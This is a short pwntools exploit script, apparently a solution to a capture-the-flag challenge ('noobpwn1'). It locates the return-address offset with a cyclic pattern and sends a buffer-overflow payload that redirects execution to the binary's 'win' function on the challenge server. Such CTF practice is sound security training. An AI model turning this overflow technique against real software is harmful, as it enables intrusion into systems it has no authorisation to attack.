#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.n00bzunit3d.xyz --port 35932 pwn1
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF('./noob/noobpwn1', checksec=True)

# Enable verbose logging so we can see exactly what is being sent (info/debug)
# context.log_level = 'debug'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 35932)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
    
# Find offset to EIP/RIP for buffer overflows    
def find_ip(payload):
    # Launch process and send payload
    p = process(elf.path, level='warn')
    p.sendlineafter(b'?', payload)
    # Wait for the prcoess to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc) # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    warn('Located EIP/RIP offset at {a}'.format(a = ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = find_ip(cyclic(128))
payload = flat(
    b'A' * offset,
    elf.symbols.win
)

io.sendlineafter(b'?', payload)
io.interactive()
